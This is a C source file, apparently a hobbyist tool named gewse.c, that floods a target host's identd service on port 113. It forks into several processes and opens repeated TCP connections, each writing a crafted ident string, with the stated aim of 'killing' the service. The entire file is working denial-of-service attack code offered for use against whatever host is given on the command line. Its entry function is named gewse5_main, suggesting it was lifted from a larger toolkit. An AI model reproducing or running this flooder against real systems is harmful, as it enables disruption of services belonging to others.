/* gewse.c by napster..
 * my first attempt at anything so it sucks..
 * werd to prym, vcx, and djesus for help
 * werd to aut0psy the C genius for rewriting lots of it 
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>

#define MAX                      512

/* Prototypes */
unsigned int gewse5_resolve(char *host);
void gewse5_usage(char *progname);
void reseed(void);

void gewse5_usage(char *progname)
{
        printf("gewse.c by napster...\n");
        printf("gewse5_usage: %s <host> <# of connex>\n",progname);
        exit(-1);
}

gewse5_main(int argc, char *argv[])
{
 /* Mainly by napster - a lot reorganized/rewritten by Aut0psy... */
        
        unsigned int gewse5_resolved_host;
        struct sockaddr_in sin[MAX];
        int numkill, x, y, port, sdesc[MAX];
        char *getident = malloc(128);

        if (argc < 3) gewse5_usage(argv[0]);

        reseed();

        gewse5_resolved_host = gewse5_resolve(argv[1]);    
        numkill = atoi(argv[2]);

        printf("Flooding %s identd %d times.\n", argv[1], numkill);
        printf("Killing");
        fflush(stdout);

        y = 0;

        fork();
        fork();
	fork();	

        for (x=0;x<numkill;x++) {

                y++;
                if (x == MAX) x = 0;

                /* Create Socket */
                sdesc[x] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

                if (sdesc[x] < 0) 
                {
                        perror("socket");
                        exit(-1);
                }

                /* Fill in Socket Endpoint */
                sin[x].sin_family = AF_INET;
                sin[x].sin_port = htons(113);
                sin[x].sin_addr.s_addr = gewse5_resolved_host;

                /* Make a random port identd string. */
                port = 1+(int) (10000.0*rand()/(RAND_MAX + 1.0));
                sprintf(getident, "%d, 6667 : USERID : UNIX : die\n", port);

                /* Connect to dest host. */
                if (connect(sdesc[x], (struct sockaddr *)&sin[x], sizeof(sin[x])) < 0)
                {
                        perror("connect");
                        exit(-1);
                }

                printf(".");
                fflush(stdout);

                /* Send random port identd string over the socket. */
                (void) write(sdesc[x], getident, strlen(getident));
          
                if (y >= numkill) break;
        }

        printf("\n");

}

unsigned int gewse5_resolve(char *host) 
{
  /* gewse5_resolve routine written by Aut0psy. */

        struct hostent *he;
        struct sockaddr_in tmp;

        /* Lookup host. */
        he = gethostbyname(host);

        if (he) 
        {
                /* Copy host into a temporary endpoint. */
                memcpy((caddr_t)&tmp.sin_addr.s_addr, he->h_addr, he->h_length);
        } else {
                perror("resolving");
                exit(-1);
        }

        /* Return address in network byte order. */  
        return(tmp.sin_addr.s_addr);
}

void reseed(void) 
{
        /* Seed random number database based on time of day... */
        srand(time(NULL));
}
